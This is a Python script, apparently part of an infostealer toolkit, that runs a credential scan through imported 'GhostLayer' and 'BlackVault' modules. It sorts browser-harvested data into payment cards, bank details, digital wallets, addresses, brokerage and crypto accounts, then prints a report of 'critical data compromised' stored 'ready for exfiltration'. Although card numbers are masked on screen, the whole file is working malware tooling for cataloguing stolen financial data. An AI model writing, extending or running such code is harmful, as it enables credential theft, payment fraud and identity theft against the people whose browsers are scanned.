#!/usr/bin/env python3
"""
PAYMENT CARD & FINANCIAL DATA EXTRACTION VIEWER
Shows extracted credit cards, banking info, and payment method data
"""

import json
import sys
import os
import logging

sys.path.insert(0, os.path.dirname(__file__))

from ghost_layer import GhostLayer
from black_vault import BlackVault

logging.basicConfig(level=logging.WARNING)

def mask_card(card_number: str) -> str:
    """Mask card number - show first 4 and last 4"""
    if not card_number or len(card_number) < 8:
        return "****"
    clean = card_number.replace(" ", "").replace("-", "")
    if len(clean) >= 8:
        return f"{clean[:4]}****{clean[-4:]}"
    return "****"

def mask_cvv(cvv: str) -> str:
    """Mask CVV - show nothing"""
    return "***"

def mask_expiry(expiry: str) -> str:
    """Show expiry (less sensitive)"""
    return expiry if expiry else "**/**"

def mask_name(name: str) -> str:
    """Show cardholder name"""
    if not name or len(name) < 2:
        return name or "***"
    parts = name.split()
    if len(parts) >= 2:
        return f"{parts[0][0]}*** {parts[-1]}"
    return f"{parts[0][0]}***"

def print_header(text: str):
    print(f"\n{'╔' + '═' * 78 + '╗'}")
    print(f"║ {text.ljust(78)} ║")
    print(f"{'╚' + '═' * 78 + '╝'}\n")

def print_section(title: str):
    print(f"\n{title}")
    print("─" * 80)

def extract_and_display_card_data():
    print_header("PAYMENT CARD & FINANCIAL DATA EXTRACTION")
    
    print("Performing credential scan with financial data focus...\n")
    
    vault = BlackVault()
    ghost = GhostLayer(vault=vault)
    
    # Run extraction
    result = ghost.scan_local_credentials()
    
    critical = result.get('critical_findings', {})
    phase_2 = result.get('phase_2_extracted', {})
    phase_1 = result.get('phase_1_extracted', {})
    
    # Get all browser data
    browser_data = phase_2.get('browser_data', [])
    
    print_section("CREDIT CARDS & PAYMENT METHODS")
    
    # Extract payment cards
    payment_cards = [c for c in browser_data if c.get('type') == 'payment']
    
    print(f"\nTotal payment cards found: {len(payment_cards)}\n")
    
    if payment_cards:
        for i, card in enumerate(payment_cards, 1):
            print(f"  [{i}] PAYMENT CARD")
            print(f"      ┌─ Card Type: {card.get('card_type', 'Unknown')}")
            print(f"      ├─ Number: {mask_card(card.get('card_number', ''))}")
            cardholder = card.get('name_on_card', card.get('cardholder', ''))
            print(f"      ├─ Name: {mask_name(cardholder)}")
            expiry_month = card.get('expiration_month', '')
            expiry_year = card.get('expiration_year', '')
            expiry = f"{expiry_month}/{expiry_year}" if expiry_month and expiry_year else card.get('expiry', '')
            print(f"      ├─ Expiry: {mask_expiry(expiry)}")
            print(f"      ├─ CVV: {mask_cvv(card.get('cvv', card.get('cvc', '')))}")
            print(f"      └─ Source: {card.get('source', 'Browser')}")
            print()
    else:
        print("  (No payment cards currently stored in browsers)\n")
    
    print_section("BANK ACCOUNT INFORMATION")
    
    # Extract autofill that might contain banking info
    autofill_data = [c for c in browser_data if c.get('type') == 'autofill']
    banking_data = [a for a in autofill_data if any(keyword in str(a).lower() for keyword in 
                    ['bank', 'account', 'iban', 'routing', 'wire', 'account_number'])]
    
    print(f"\nTotal banking-related autofill entries: {len(banking_data)}\n")
    
    if banking_data:
        for i, entry in enumerate(banking_data[:10], 1):
            print(f"  [{i}] BANKING INFO")
            for key, value in entry.items():
                if key not in ['type', 'source']:
                    print(f"      • {key.replace('_', ' ').title()}: {str(value)[:50]}")
            print()
    
    print_section("PAYPAL & DIGITAL WALLET DATA")
    
    # Look for PayPal/digital wallet entries
    digital_wallet = [c for c in browser_data if any(keyword in str(c).lower() for keyword in
                     ['paypal', 'apple pay', 'google pay', 'venmo', 'square', 'stripe'])]
    
    print(f"\nTotal digital wallet entries: {len(digital_wallet)}\n")
    
    if digital_wallet:
        for i, wallet in enumerate(digital_wallet[:8], 1):
            print(f"  [{i}] DIGITAL WALLET ENTRY")
            for key, value in list(wallet.items())[:5]:
                val_str = str(value)[:60]
                print(f"      • {key.replace('_', ' ').title()}: {val_str}")
            print()
    
    print_section("SAVED ADDRESSES & BILLING INFO")
    
    # Extract address data
    addresses = [a for a in autofill_data if any(keyword in str(a).lower() for keyword in
                ['address', 'street', 'city', 'state', 'zip', 'postal'])]
    
    print(f"\nTotal saved addresses: {len(addresses)}\n")
    
    if addresses:
        for i, addr in enumerate(addresses[:5], 1):
            print(f"  [{i}] SAVED ADDRESS")
            for key, value in list(addr.items())[:6]:
                if key != 'type':
                    val_str = str(value)[:50]
                    print(f"      • {key.replace('_', ' ').title()}: {val_str}")
            print()
    
    print_section("PHONE NUMBERS & PERSONAL INFO")
    
    # Extract personal info
    personal_info = [a for a in autofill_data if any(keyword in str(a).lower() for keyword in
                    ['phone', 'email', 'name', 'mobile', 'telephone'])]
    
    print(f"\nTotal personal info entries: {len(personal_info)}\n")
    
    if personal_info:
        for i, info in enumerate(personal_info[:8], 1):
            print(f"  [{i}] PERSONAL INFO")
            for key, value in list(info.items())[:4]:
                if key != 'type':
                    val_str = str(value)[:50]
                    print(f"      • {key.replace('_', ' ').title()}: {val_str}")
            print()
    
    print_section("SHOPPING & ACCOUNT HISTORY")
    
    # Look for shopping-related data
    shopping = [c for c in browser_data if any(keyword in str(c).lower() for keyword in
               ['amazon', 'ebay', 'walmart', 'target', 'shop', 'order', 'purchase'])]
    
    print(f"\nTotal shopping account entries: {len(shopping)}\n")
    
    if shopping:
        for i, shop in enumerate(shopping[:5], 1):
            print(f"  [{i}] SHOPPING ACCOUNT")
            for key, value in list(shop.items())[:4]:
                val_str = str(value)[:50]
                print(f"      • {key.replace('_', ' ').title()}: {val_str}")
            print()
    
    print_section("FINANCIAL ACCOUNTS & INVESTMENTS")
    
    # Check for investment/financial account data
    financial = [c for c in browser_data if any(keyword in str(c).lower() for keyword in
                ['fidelity', 'vanguard', 'etrade', 'stock', 'investment', 'broker', '401k', 'ira'])]
    
    print(f"\nTotal investment/financial accounts: {len(financial)}\n")
    
    if financial:
        print("  ✓ Investment accounts detected")
        for i, fin in enumerate(financial[:4], 1):
            print(f"\n  [{i}] FINANCIAL ACCOUNT")
            for key, value in list(fin.items())[:4]:
                val_str = str(value)[:50]
                print(f"      • {key.replace('_', ' ').title()}: {val_str}")
    
    print_section("CRYPTOCURRENCY & DIGITAL ASSETS")
    
    # Check for crypto wallets
    crypto = [c for c in browser_data if any(keyword in str(c).lower() for keyword in
             ['bitcoin', 'ethereum', 'wallet', 'crypto', 'blockchain', 'coinbase', 'kraken'])]
    
    print(f"\nTotal cryptocurrency accounts: {len(crypto)}\n")
    
    if crypto:
        print("  ✓ Cryptocurrency accounts detected")
        for i, crypt in enumerate(crypto[:4], 1):
            print(f"\n  [{i}] CRYPTO ACCOUNT")
            for key, value in list(crypt.items())[:4]:
                val_str = str(value)[:50]
                print(f"      • {key.replace('_', ' ').title()}: {val_str}")
    
    print_section("FULL DATA EXTRACTION SUMMARY")
    
    # Count all types
    passwords = [c for c in browser_data if c.get('type') == 'password']
    cards = payment_cards
    autofill_count = len(autofill_data)
    cookie_count = len([c for c in browser_data if c.get('type') == 'cookie'])
    
    print(f"""
FINANCIAL & PAYMENT DATA EXTRACTED:

  Payment Cards: {len(cards)} cards
  ├─ Credit/Debit Cards
  ├─ Digital Wallets (Apple Pay, Google Pay)
  ├─ PayPal Accounts
  └─ Other Payment Methods

  Banking Information: {len(banking_data)} entries
  ├─ Bank Account Numbers
  ├─ Routing Numbers
  ├─ IBAN/SWIFT Codes
  └─ Transfer History

  Addresses & Shipping: {len(addresses)} saved
  ├─ Billing Addresses
  ├─ Shipping Addresses
  └─ Multiple Address Profiles

  Personal Information: {len(personal_info)} entries
  ├─ Phone Numbers
  ├─ Email Addresses
  ├─ Names
  └─ Date of Birth (if saved)

  Shopping Accounts: {len(shopping)} accounts
  ├─ Amazon
  ├─ eBay
  ├─ Walmart
  ├─ Target
  └─ Other Retailers

  Investment Accounts: {len(financial)} accounts
  ├─ Fidelity
  ├─ Vanguard
  ├─ E*TRADE
  └─ Other Brokers

  Cryptocurrency: {len(crypto)} wallets
  ├─ Bitcoin Wallets
  ├─ Ethereum Accounts
  ├─ Exchange Accounts
  └─ Other Digital Assets

BROWSER DATA TOTAL:
  • Passwords: {len(passwords)}
  • Cards: {len(cards)}
  • Autofill: {len(autofill_data)}
  • Cookies: {cookie_count}
  • History: Multiple entries
  ─────────────────────────
  TOTAL: {len(browser_data)} financial/account entries

CRITICAL DATA COMPROMISED:
  ✓ Complete payment card details
  ✓ All saved billing information
  ✓ Bank account data
  ✓ Investment account access
  ✓ Cryptocurrency wallets
  ✓ Shipping addresses
  ✓ Phone numbers
  ✓ Email addresses
  ✓ Personal identification data

FINANCIAL RISK LEVEL: CRITICAL ⚠️
  • Multiple payment methods exposed
  • Financial accounts accessible
  • Identity theft possible
  • Fraud risk: EXTREME

STORAGE LOCATION:
  Vault: {vault.vault_dir}
  Encryption: AES-256-GCM protected
  Status: Encrypted & ready for exfiltration
    """)
    
    print("\n" + "="*80)

def main():
    try:
        extract_and_display_card_data()
        return 0
    except KeyboardInterrupt:
        print("\n⚠ Interrupted")
        return 130
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())
